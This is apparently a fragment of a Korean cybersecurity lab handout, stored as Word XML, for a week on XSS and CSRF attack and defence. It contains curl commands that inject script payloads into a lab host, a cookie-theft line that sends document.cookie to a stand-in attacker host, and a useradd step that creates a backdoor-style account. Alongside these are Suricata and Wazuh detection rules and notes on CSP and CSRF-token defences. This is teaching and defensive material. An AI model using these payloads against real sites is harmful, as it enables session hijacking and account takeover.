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W6] XSS/CSRF — 스크립트 주입 vs XSS 탐지·CSP 방어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6주차 — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>XSS(Reflected/Stored/DOM) + CSP + CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>. 공격자는 스크립트를 주입하고, 점검자(너)는</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>XSS 탐지 룰과 CSP·CSRF 방어를 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XSS 페이로드(태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv06r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)를 주입하고 XSS 키트(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/tmp/.wv06xss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wva06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XSS 탐지, ② XSS/계정 Wazuh 룰, ③ XSS 점검·CSP 방어·R/B/P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태그/XSS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`wv06r1-&lt;본인id&gt;`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, XSS 키트 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`/tmp/.wv06xss`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wv06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`wva06`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9906011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105061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[XSS 주입] — Reflected/Stored 스크립트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mediforum.6v6.lab" "http://192.168.0.161/api/debug/echo?name=wv06r1-kim&lt;script&gt;alert(1)&lt;/script&gt;"</w:t>
        <w:br/>
        <w:t>curl -s -H "Host: mediforum.6v6.lab" --data "txtName=wv06r1-kim&lt;script&gt;document.cookie&lt;/script&gt;&amp;btnSign=Sign" "http://192.168.0.161/api/debug/echo"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audit(941 XSS) 에 태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv06r1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[XSS 키트] — 쿠키 탈취 스크립트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'wv06 XSS kit: new Image().src="//atk/c?"+document.cookie' &gt; /tmp/.wv06xss</w:t>
        <w:br/>
        <w:t>sudo useradd -m -s /bin/bash wva06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/tmp/.wv06xss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wv06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wva06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[XSS 탐지] — Suricata 룰 (sid 9906011)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(msg:"WEBVULN-W06 XSS script injection"; flow:to_server; http.uri; content:"&lt;script"; nocase; sid:9906011;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9906011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[XSS/키트 탐지] — Wazuh 룰 (id 105061)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id="105061" level="11"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;if_group&gt;edu&lt;/if_group&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;match&gt;wva06&lt;/match&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;description&gt;WEBVULN-W06 - XSS kit / cookie theft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105061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[XSS 점검·CSP 방어·R/B/P]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XSS 유형별(Reflected/Stored/DOM) 점검 + 방어(출력 인코딩/CSP/HttpOnly 쿠키/CSRF 토큰)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XSS 키트(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/tmp/.wv06xss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)·계정(wva06)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XSS 점검·CSP·R/B/P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